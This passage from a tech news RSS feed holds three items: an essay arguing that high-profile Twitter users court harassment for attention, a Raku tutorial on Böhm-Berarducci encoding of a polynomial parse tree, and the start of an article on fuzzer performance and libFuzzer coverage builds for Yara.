<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After Ruth Bader Ginsburg died, Reza Aslan, the famous broadcast commentator and scholar of religion, published a tweet <a href="https://twitter.com/rezaaslan/status/1307107507131875330" target="_blank">which read</a>, ‚ÄúIf they even TRY to replace RBG we burn the entire fucking thing down.‚Äù<br></p><p>This was stupid, but it was also savvy.<br></p><p>Before I explain, a bit of disclosure: I have no beef with Aslan, <a href="https://www.thecut.com/2014/10/reza-aslan-on-what-the-new-atheists-get-wrong.html" target="_blank">published an enjoyable interview with him in 2014</a>, and <a href="https://twitter.com/jessesingal/status/873752684456706048" target="_blank">thought</a> (and continue to think) he got a raw deal when CNN let him go for <a href="https://money.cnn.com/2017/06/09/media/cnn-reza-aslan-decision/index.html">‚Äúprofane anti-Trump tweets.‚Äù</a><br></p><p>But Aslan‚Äôs tweet and its aftermath highlight a pretty ridiculous reality of online life these days, which is that big names on Twitter and other platforms regularly seek out harassment in the most obvious ways, and then, when said harassment (inevitably) arrives, attempt to leverage it to boost their brand and gain attention.</p><p>Aslan‚Äôs tweet was met with fury, because of course it was ‚Äî it sounded like he was saying liberals should burn down the entire country over the RBG seat. Aslan was firehosed with a bunch of negative reactions on Twitter and elsewhere, and eventually that fury led to an article in <em>American Greatness</em>, a right-wing outlet, headlined <a href="https://amgreatness.com/2020/09/20/the-loathsomeness-of-reza-aslan/" target="_blank">‚ÄúThe Loathsomeness of Reza Aslan,‚Äù</a> as well as a Breitbart story whose headline contained the overheated claim that Aslan‚Äôs tweet constituted a <a href="https://www.breitbart.com/2020-election/2020/09/18/blue-checks-vow-violence-if-mcconnell-tries-to-replace-ruth-bader-ginsburg-burn-the-entire-fking-thing-down/" target="_blank">‚Äúvow [of] violence.‚Äù</a></p></div><div><p>Aslan, of course, replied with a <a href="https://twitter.com/rezaaslan/status/1308165311330304000" target="_blank">tweet linking to the American Greatness story</a> that read, ‚ÄúI love this, especially when I think about the fact that Trump‚Äôs followers have been encouraged by him to literally murder people. But yeah, Ok.‚Äù Earlier that day, he also <a href="https://twitter.com/rezaaslan/status/1308056797110915073" target="_blank">tweeted</a>, ‚ÄúBeen a few days since I tweeted that if GOP try to jam a SCOTUS thru B4 election we burn the fucking thing down &amp; since the death threats &amp; Breitbart headlines about my tweet have now stopped let me just say that if GOP try to jam SCOTUS through we burn the fucking thing down.‚Äù</p><p>To anyone who understands how the internet works, it shouldn‚Äôt come as a surprise that Aslan received death threats and, in all likelihood, all sorts of other abuse. This is horrific behavior, and anyone who sends a death threat to anyone should get a visit from the cops.</p><p>But it is also clear that Aslan is doing everything in his power to keep the online conflagration burning ‚Äî he is quite directly feeding it fuel. This is a behavior I‚Äôve noticed over and over among certain types on Twitter, who complain about harassment even as they do seemingly everything to maximize the probability of antagonizing as many people as possible, leading to yet more harassment.</p><p>For some people, this is chronic behavior that almost comes across as an addiction. I‚Äôm not trying to start fights, so I‚Äôll leave names out of this, but there are certain feminist writers who will tweet, endlessly and obsessively, about the supposed evils of ‚ÄúBernieBros.‚Äù Just over and over and over, long after the point has been made repeatedly. Bernie Twitter, like every other subculture, does have a subset of unhinged people who are unable to resist rising to bait ‚Äî plus, there are always trollish third parties like 4chan who seek out internet drama to stoke ‚Äî so inevitably, if someone talks smack about Sanders over and over and over, they will be the targetof harassment. That harassment, in turn, proves just how evil Bernie supporters are. And on and on the cycle goes, making everyone dumber and more cynical.</p><p>All this stuff is very performative, very geared toward online brand-boosting, and makes it harder to take online harassment ‚Äî which in its <a href="https://nymag.com/intelligencer/2015/09/victim-of-a-scary-web-shaming-speaks-out.html" target="_blank">most serious forms really can be terrifying </a>‚Äî seriously. Being the victim of online harassment absolutely confers status and attention. That doesn‚Äôt mean anyone <em>deserves </em>it, of course, or that it‚Äôs fun to have death threats in your inbox.&nbsp;</p><p>But it does feel like there‚Äôs a willful inability to understand that if you yell out provocative stuff in a public space over and over, and do everything you can to draw attention to yourself and your controversial views in insulting ways, there‚Äôs very little that anyone can do to prevent a small (proportionally speaking) subset of people from responding with disproportionate ire ‚Äî sometimes of the abusive variety.<br></p></div></div>]]>
            </description>
            <link>https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579258</guid>
            <pubDate>Thu, 24 Sep 2020 15:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A universal interpreter ‚Äì Wim Vanderbauwhede]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579253">thread link</a>) | @lizmat
<br/>
September 24, 2020 | https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/ | <a href="https://web.archive.org/web/*/https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" itemprop="articleBody">
				<p>In <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-1">the previous article</a> I explained the basic idea behind a technique called <a href="http://okmij.org/ftp/tagless-final/course/Boehm-Berarducci.html">B√∂hm-Berarducci encoding</a> of algebraic data types, and showed a way to implement this technique in <a href="https://raku.org/">Raku</a>. Unless you are already familiar with this formalism, I recommend you read that article first. </p>

<p>In this article I want to illustrate how the B√∂hm-Berarducci (BB) encoding of a data structure based on algebraic data types can be considered as a universal interpreter. What this means is that it is easy to perform computations that turn the data structure into something else. As an example, I will demonstrate how to create an evaluator and pretty-printer for a parsed polynomial expression.</p>

<h2>A parse tree type</h2>

<p>Consider expressions of the form <code>a*x^2+b*x+c</code> or <code>x^3+1</code> or <code>x*y^2-x^2*y</code>. Let's assume we have a parser for such an expression, for example built using <a href="https://wimvanderbauwhede.github.io/articles/list-based-parser-combinators/">parser combinators</a>. Let's also assume that this parser returns the parsed data as an algebraic data type, defined in Haskell as:</p>
<div><pre><code data-lang="haskell"><span></span><span>data</span> <span>Term</span> <span>=</span> 
      <span>Var</span> <span>String</span>
    <span>|</span> <span>Par</span> <span>String</span> 
    <span>|</span> <span>Const</span> <span>Int</span>
    <span>|</span> <span>Pow</span> <span>Term</span> <span>Int</span>
    <span>|</span> <span>Add</span> <span>[</span><span>Term</span><span>]</span>
    <span>|</span> <span>Mult</span> <span>[</span><span>Term</span><span>]</span>
</code></pre></div>
<p>and in Raku:</p>
<div><pre><code data-lang="perl6"><span></span><span>role</span> <span>Term</span> {}
<span>role</span> <span>Var</span> [<span>Str</span> \<span>v</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Str</span> <span>$.var</span> = <span>v</span>;
}
<span>role</span> <span>Par</span> [<span>Str</span> \<span>p</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Str</span> <span>$.par</span> = <span>p</span>;
}
<span>role</span> <span>Const</span> [<span>Int</span> \<span>c</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Int</span> <span>$.const</span> = <span>c</span>;
}
<span>role</span> <span>Pow</span> [<span>Term</span> \<span>t</span>, <span>Int</span> \<span>n</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Term</span> <span>$.term</span> = <span>t</span>;
    <span>has</span> <span>Int</span> <span>$.exp</span> = <span>n</span>;
}
<span>role</span> <span>Add</span> [<span>Array</span>[<span>Term</span>] \<span>ts</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Array</span>[<span>Term</span>] <span>$.terms</span> = <span>ts</span>;
}
<span>role</span> <span>Mult</span> [<span>Array</span>[<span>Term</span>] \<span>ts</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Array</span>[<span>Term</span>] <span>$.terms</span> = <span>ts</span>;
}
</code></pre></div>
<p>The additional complexity compared to the types discussed in <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-1">the previous article</a> is that this type is recursive: the <code>Pow</code>, <code>Add</code> and <code>Mult</code> roles take parameters of type <code>Term</code>. </p>

<p>Before we look at the BB encoding, let's first write a pretty-printer for this type, using recursive <code>multi sub</code>s. </p>
<div><pre><code data-lang="perl6"><span></span><span># Pretty-print a Term </span>
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Var</span> \<span>t</span>) { <span>t</span>.<span>var</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Par</span> \<span>c</span>) { <span>c</span>.<span>par</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Const</span> \<span>n</span>) { <span>"{n.const}"</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Pow</span> \<span>pw</span>){ 
    <span>ppTerm</span>(<span>pw</span>.<span>term</span>) ~ <span>'^'</span> ~ <span>"{pw.exp}"</span> 
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Add</span> \<span>t</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>@pts</span>)~<span>")"</span>
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Mult</span> \<span>t</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>join</span>( <span>" * "</span>, <span>@pts</span>)
}
</code></pre></div>
<p>In the same way we can write an evaluator for this type:</p>
<div><pre><code data-lang="perl6"><span></span><span># Evaluate a Term </span>
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>, <span>Var</span> \<span>t</span>) { <span>%vars</span>{<span>t</span>.<span>var</span>} }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Par</span> \<span>c</span>) { <span>%pars</span>{<span>c</span>.<span>par</span>} }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Const</span> \<span>n</span>) { <span>n</span>.<span>const</span> }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Pow</span> \<span>pw</span>){ 
    <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>pw</span>.<span>term</span>) ** <span>pw</span>.<span>exp</span> 
}
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Add</span> \<span>t</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    [+] <span>@pts</span>
}
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Mult</span> \<span>t</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    [*] <span>@pts</span>
}
</code></pre></div>
<h3>Example parse trees</h3>

<p>As an example, let's create the parse tree for a few expressions using the <code>Term</code> type.</p>
<div><pre><code data-lang="perl6"><span></span><span># a*x^2 + b*x + x</span>
<span>my</span> \<span>qterm1</span> = <span>Add</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
    <span>Mult</span>[ <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>Par</span>[ <span>"a"</span>].<span>new</span>, 
        <span>Pow</span>[ <span>Var</span>[ <span>"x"</span>].<span>new</span>, <span>2</span>].<span>new</span>) 
        ].<span>new</span>,
    <span>Mult</span>[
        <span>Array</span>[<span>Term</span>].<span>new</span>(
            <span>Par</span>[ <span>"b"</span>].<span>new</span>, 
            <span>Var</span>[ <span>"x"</span>].<span>new</span>) 
        ].<span>new</span>,
    <span>Par</span>[ <span>"c"</span>].<span>new</span>
    )
    ].<span>new</span>;

<span>#   x^3 + 1    </span>
<span>my</span> \<span>qterm2</span> = <span>Add</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>Pow</span>[ <span>Var</span>[ <span>"x"</span>].<span>new</span>, <span>3</span>].<span>new</span>, 
        <span>Const</span>[ <span>1</span>].<span>new</span>
    )
    ].<span>new</span>;

<span>#   qterm1 * qterm2    </span>
<span>my</span> \<span>qterm</span> = <span>Mult</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>qterm1</span>, <span>qterm2</span>
    )
    ].<span>new</span>;
</code></pre></div>
<p>Calling the pretty-printer and evaluator on this term: </p>
<div><pre><code data-lang="perl6"><span></span><span>say</span> <span>ppTerm</span>( <span>qterm</span>); <span># =&gt; (a * x^2 + b * x + c) * (x^3 + 1)</span>

<span>say</span> <span>evalTerm</span>(
    {<span>"x"</span> =&gt; <span>2</span>}, {<span>"a"</span> =&gt;<span>2</span>,<span>"b"</span>=&gt;<span>3</span>,<span>"c"</span>=&gt;<span>4</span>},  <span>qterm</span>
); <span># =&gt; 162</span>
</code></pre></div>
<h2>BB encoding of the parse tree type</h2>

<p>The BB encoding of the <code>Term</code> algebraic data type in Raku is pleasingly compact:</p>
<div><pre><code data-lang="perl6"><span></span><span>role</span> <span>TermBB</span>[<span>&amp;f</span>] {
    <span>method</span> <span>unTermBB</span>(
        <span>&amp;var:</span>(<span>Str</span> --&gt; <span>Any</span>),
        <span>&amp;par:</span>(<span>Str</span> --&gt; <span>Any</span>),
        <span>&amp;const:</span>(<span>Int</span> --&gt; <span>Any</span>),
        <span>&amp;pow:</span>(<span>Any</span>,<span>Int</span> --&gt; <span>Any</span>),
        <span>&amp;add:</span>(<span>Array</span>[<span>Any</span>] --&gt; <span>Any</span>),
        <span>&amp;mult:</span>(<span>Array</span>[<span>Any</span>] --&gt; <span>Any</span>) 
        --&gt; <span>Any</span>
    ) {
        <span>f</span>(<span>&amp;var</span>,<span>&amp;par</span>,<span>&amp;const</span>,<span>&amp;pow</span>,<span>&amp;add</span>,<span>&amp;mult</span>);
    }
}
</code></pre></div>
<p>It would of course be even more compact without the signatures, but then we'd have no information about the encoded type.</p>

<p>We could of course use this type directly, but instead I want to look at how we can convert between <code>Term</code> and <code>TermBB</code>. </p>

<p>As before, we create our little helpers. Each of the functions below is a constructor which generates the <code>TermBB</code> instance for the corresponding alternative in the <code>Term</code> algebraic data type. (When Raku's macro language is more developed, we will be able to generate these automatically.)</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>VarBB</span>(<span>Str</span> \<span>s</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { v.(s)</span> }
    ].<span>new</span>;
    }
<span>sub</span> <span>ParBB</span>(<span>Str</span> \<span>s</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { c.(s)</span> }
    ].<span>new</span>;
    }
<span>sub</span> <span>ConstBB</span>(<span>Int</span> \<span>i</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { n.(i)</span> }
    ].<span>new</span>;
    }    
<span>sub</span> <span>PowBB</span>( <span>TermBB</span> \<span>t</span>, <span>Int</span> \<span>i</span> --&gt; <span>TermBB</span>) {
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        p.( t.unTermBB( v, c, n, p, a, m )</span>, <span>i</span>);
    }
    ].<span>new</span>;
}
<span>sub</span> <span>AddB</span>( <span>Array</span>[<span>TermBB</span>] \<span>ts</span> --&gt; <span>TermBB</span>) {
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        a.( map {.unTermBB( v, c, n, p, a, m )</span>}, <span>ts</span> )
    }
    ].<span>new</span>;
}
<span>sub</span> <span>MultBB</span>(  <span>Array</span>[<span>TermBB</span>] \<span>ts</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        m.( map {.unTermBB( v, c, n, p, a, m )</span>}, <span>ts</span> )
    }
    ].<span>new</span>;
}
</code></pre></div>
<p>The interesting generators are <code>PowBB</code>, <code>AddBB</code> and <code>MultBB</code> because they are recursive. In <code>PowBB</code>, the function passed as parameter to the <code>TermBB</code> role constructor calls <code>p</code> which has a signature of <code>:(Any,Int --&gt; Any)</code>, but actually requires an argument of the same type as the return value (we need <code>a -&gt; Int -&gt; a</code>). The argument <code>t</code>  is of type <code>TermBB</code> which is a wrapper around a function which, when applied, will return the right type. In the Raku implementation, this function is the method <code>unTermBB</code>. So we need to call <code>t.unTermBB( ... )</code>.
In <code>AddBB</code> and <code>MultBB</code>, we have an <code>Array[TermBB]</code> so we need to call <code>unTermBB</code> on every element, hence the <code>map</code> call.</p>

<p>Using these generators we can write a single function to convert the algebraic data type into its BB encoding. Unsurprisingly, it is very similar to the pretty-printer and evaluator we wrote for <code>Term</code> instances:</p>
<div><pre><code data-lang="perl6"><span></span><span># Turn a Term into a BB Term</span>
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Var</span> \<span>t</span>  ) { <span>VarBB</span>(<span>t</span>.<span>var</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Par</span> \<span>c</span>  ) { <span>ParBB</span>( <span>c</span>.<span>par</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Const</span> \<span>n</span>) {<span>ConstBB</span>(<span>n</span>.<span>const</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Pow</span> \<span>pw</span> ) { 
    <span>PowBB</span>( <span>termToBB</span>(<span>pw</span>.<span>term</span>), <span>pw</span>.<span>exp</span>)
}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Add</span> \<span>t</span>  ) { 
    <span>AddBB</span>( <span>typed-map</span>( <span>TermBB</span>, <span>t</span>.<span>terms</span>, <span>&amp;termToBB</span> ))
}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Mult</span> \<span>t</span> ) { 
    <span>MultBB</span>( <span>typed-map</span>( <span>TermBB</span>, <span>t</span>.<span>terms</span>, <span>&amp;termToBB</span> ))
}

<span># map &amp;f and return in an Array of type T</span>
<span>sub</span> <span>typed-map</span> (\<span>T</span>,\<span>lst</span>,<span>&amp;f</span>) {
    <span>Array</span>[<span>T</span>].<span>new</span>(<span>map</span> {<span>f</span>(<span>$_</span>) }, |<span>lst</span> )
}
</code></pre></div>
<p>Because <code>PowBB</code>, <code>AddBB</code> and <code>MultBB</code> require a <code>TermBB</code>, we need to call <code>termToBB</code> on the <code>Term</code> fields. And because  <code>AddBB</code> and <code>MultBB</code> take an array of <code>Term</code>,  we need a <code>map</code>. However, Raku's <code>map</code> returns values of type <code>Seq</code>, so we need an explicit conversion into <code>Array</code>.</p>

<p>We can now convert any data structure of type <code>Term</code> into its BB encoding:</p>
<div><pre><code data-lang="perl6"><span></span><span>my</span> \<span>qtermbb</span> = <span>termToBB</span>( <span>qterm</span>);

<span>say</span> <span>qtermbb</span>.<span>raku</span>; <span># =&gt; TermBB[Sub].new</span>
</code></pre></div>
<h3>Interpreter 1: Pretty-printer with BB encoding</h3>

<p>To create a pretty-printer for the BB-encoded type, we write implementations for each alternative, and the <code>unTermBB</code> call magically combines these.</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>ppTermBB</span>(<span>TermBB</span> \<span>t</span> --&gt; <span>Str</span>){ 
    <span>sub</span> <span>var</span>( \<span>x</span> ) { <span>x</span> }
    <span>sub</span> <span>par</span>( \<span>x</span> ) { <span>x</span> }
    <span>sub</span> <span>const</span>(\<span>x</span> ) { <span>"{x}"</span> }
    <span>sub</span> <span>pow</span>( \<span>t</span>, \<span>m ) { t ~ "^{m}" } </span>
<span>    sub add( \ts )</span> { <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>ts</span>)~<span>")"</span> }
    <span>sub</span> <span>mult</span>( \<span>ts</span> ) { <span>join</span>( <span>" * "</span>, <span>ts</span>) }
    <span>t</span>.<span>unTermBB</span>( <span>&amp;var</span>, <span>&amp;par</span>, <span>&amp;const</span>, <span>&amp;pow</span>, <span>&amp;add</span>, <span>&amp;mult</span>);
}
</code></pre></div>
<p>Compared with <code>ppTerm</code> (copied below for convenience), the main differences are that there is no recursion and no need to <code>map</code> anything. We also don't need a <code>multi sub</code> to pattern match on the constructors, and there is no need to unpack the values stored in the type using attribute accessors. As a result, the BB version is markedly less cluttered.</p>
<div><pre><code data-lang="perl6"><span></span><span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Var</span> \<span>t</span> --&gt; <span>Str</span>) { <span>t</span>.<span>var</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Par</span> \<span>c</span> --&gt; <span>Str</span>) { <span>c</span>.<span>par</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Const</span> \<span>n</span> --&gt; <span>Str</span>) { <span>"{n.const}"</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Pow</span> \<span>pw</span> --&gt; <span>Str</span>){ 
    <span>ppTerm</span>(<span>pw</span>.<span>term</span>) ~ <span>'^'</span> ~ <span>"{pw.exp}"</span> 
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Add</span> \<span>t</span> --&gt; <span>Str</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>@pts</span>)~<span>")"</span>
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Mult</span> \<span>t</span> --&gt; <span>Str</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>join</span>( <span>" * "</span>, <span>@pts</span>)
}
</code></pre></div>
<h3>Interpreter 2: Evaluator with BB encoding</h3>

<p>And an evaluator is equally simple:</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>evalTermBB</span>( <span>%vars</span>,  <span>%pars</span>, \<span>t</span>) {
    <span>t</span>.<span>unTermBB</span>( 
        -&gt; \<span>x</span> { <span>%vars</span>{<span>x</span>} }, 
        -&gt; \<span>x</span> { <span>%pars</span>{<span>x</span>} },
        -&gt; \<span>x</span> {<span>x</span>},
        -&gt; \<span>t</span>,\<span>m { t ** m}</span>,
        -&gt; \<span>ts</span> { [+] <span>ts</span>},
        -&gt; \<span>ts</span> { [*] <span>ts</span>}
    );
}
</code></pre></div>
<p>As with <code>evalTerm</code> below, we pass hashes for variable and parameter definitions as arguments to provide context for the evaluation. In the BB version we need to do this only once, rather than for every multi variant, so I have written it below using a <code>given/when</code>. Even then, the BB version is a lot cleaner, for the same reasons as above. </p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>, <span>Term</span> \<span>t</span>) {
    <span>given</span> <span>t</span> {
        <span>when</span> <span>Var</span> { <span>%vars</span>{<span>t</span>.<span>var</span>} }
        <span>when</span> <span>Par</span> { <span>%pars</span>{<span>t</span>.<span>par</span>} }
        <span>when</span> <span>Const</span> { <span>t</span>.<span>const</span> }
        <span>when</span> <span>Pow</span> { <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>t</span>.<span>term</span>) ** <span>t</span>.<span>exp</span> }
        <span>when</span> <span>Add</span> {
            <span>my</span> <span>@pts</span> = <span>map</span> {
                <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)
                }, |<span>t</span>.<span>terms</span>;
            [+] <span>@pts</span>
        }
        <span>when</span> <span>Mult</span> { 
            <span>my</span> <span>@pts</span> = <span>map</span> {
                <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)
                }, |<span>t</span>.<span>terms</span>;
            [*] <span>@pts</span>
        }
    }
}
</code></pre></div>
<!-- ### Interpreter 3: Pretty-printer and evaluator combined

Now we can do one better and combine these two interpreters.

```perl6
sub evalAndppTermBB(%vars,  %pars, TermBB \t ){ 
    t.unTermBB( 
        -> \x {[%vars{x},x]}, 
        -> \x {[%pars{x},x]},
        -> \x {[x,"{x}"]},
        -> \t,\m {[t[0] ** m, t[1] ~ "^{m}"] },
        -> \ts { 
            my \p = 
                reduce { [ $^a[0] + $^b[0], $^a[1] ~ " + " ~ $^b[1]] }, ts[0],  |ts[1..*];
            [ p[0], "("~p[1]~")" ]; 
        }, 
        -> \ts { 
            reduce { [ $^a[0] * $^b[0], $^a[1] ~ " * " ~ $^b[1]] }, ts[0],  |ts[1..*]
        }
    )
}

say ppTermBB( qtermbb);
say evalTermBB(
    {"x" => 2}, {"a" =>2,"b"=>3,"c"=>4},  qtermbb
);
say evalAndppTermBB(
    {"x" => 2}, {"a" =>2,"b"=>3,"c"=>4},  qtermbb
);
``` -->

<h3>Interpreter 3: Converting <code>TermBB</code> to <code>Term</code></h3>

<p>Finally, let's look at converting <code>TermBB</code> to <code>Term</code>. This is yet another type of interpreter so we can follow exactly the same approach as before: </p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>toTerm</span>(<span>TermBB</span> \<span>t</span> --&gt; <span>Term</span>){ 
        <span>sub</span> <span>var</span>( \<span>x</span> ) { <span>Var</span>[<span>x</span>].<span>new</span> }
        <span>sub</span> <span>par</span>( \<span>x</span> ) { <span>Par</span>[<span>x</span>].<span>new</span> }
        <span>sub</span> <span>const</span>( <span>$x</span> ) { <span>Const</span>[<span>$x</span>].<span>new</span> }
        <span>sub</span> <span>pow</span>( \<span>t</span>, <span>$m</span> ) { <span>Pow</span>[ <span>t</span>, <span>$m</span>].<span>new</span> } </code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/">https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/</a></em></p>]]>
            </description>
            <link>https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579253</guid>
            <pubDate>Thu, 24 Sep 2020 15:01:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to integrate a fuzzer with your project?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579207">thread link</a>) | @fcambus
<br/>
September 24, 2020 | https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Generally, during fuzz testing (regardless of the tool used to perform it:
American Fuzzy Lop, libFuzzer, or any other), we have to remember
to keep the number of iterations per second high.
This means that a good fuzzer is a fast fuzzer.</p>

<p>This is mostly facilitated by minimizing the structures and operations
needed to prepare the context. We do not reinitialize the mechanisms
of the fuzzed library for every iteration. We use the stack instead of the heap
and globals.
For example, according to
<a href="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Modern_Fuzzing_of_C_CPP_Projects.pdf">Max Moroz‚Äôs fuzzing tutorial</a>,
slide 62, handling 1 MB of
memory on the heap slows down the fuzzer two times, compared to a buffer
of the same size on the stack. A second example from the same tutorial
is the use of <code>memset(3)</code>
function for buffers on the heap that causes the fuzzer performance degradation
up to five times.
Reducing the size of buffers used temporarily is also worth considering.
Allocating a 256 kB buffer on the stack takes three times less time
compared to a 1 MB allocation.
The last ‚Äútrick‚Äù is to use global variables instead of local. The observed
efficiency gain from using this method is about two times.
Our experience shows that this is paid for with a slightly higher memory usage
at the start.</p>

<p>On the other hand, it is essential to remember to
release all the resources used during a fuzzer iteration - this ensures
that the tested program does not consume all the system memory.</p>

<p>Tuning the fuzzer usually gives measurable effects, but under certain
circumstances we will hit a performance barrier. Despite following the best
practices, we will not achieve a significant improvement of the iteration
rate. This is especially true for parsers of binary formats such as executables
or multimedia files. Fast fuzzing targets include regular expression engines,
network stacks, and text formats.</p>



<p>Both AFL++ and libFuzzer use SanitizerCoverage as the default code coverage
testing tool. A built-in LLVM tool can be used to generate reports telling us
what part of the code is being reached by our test corpora.</p>

<p>We are going to show how to work with SanitizerCoverage,
libFuzzer and the <a href="https://github.com/VirusTotal/yara">Yara project</a> example.
Yara is a tool used by malware researchers
and helps to detect and analyse malicious code. Yara is designed around
textual and binary patterns and integrates well with the libFuzzer project.</p>

<p>In order to instrument Yara with necessary code coverage, perform the following
steps:</p>

<pre><code>git clone https://github.com/Moritz-Systems/libfuzzer-coverage-yara
cd libfuzzer-coverage-yara/yara-codecov

./bootstrap.sh

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=fuzzer-no-link -fprofile-instr-generate \
  -fcoverage-mapping" \
  ./configure

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=address,fuzzer-no-link \
  -fprofile-instr-generate -fcoverage-mapping" \
  make -j4

libtool --mode=compile --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping -std=c++11 -I./libyara/include/ \
  -pthread -o yara_rules_lfuzzer_cov.o -c \
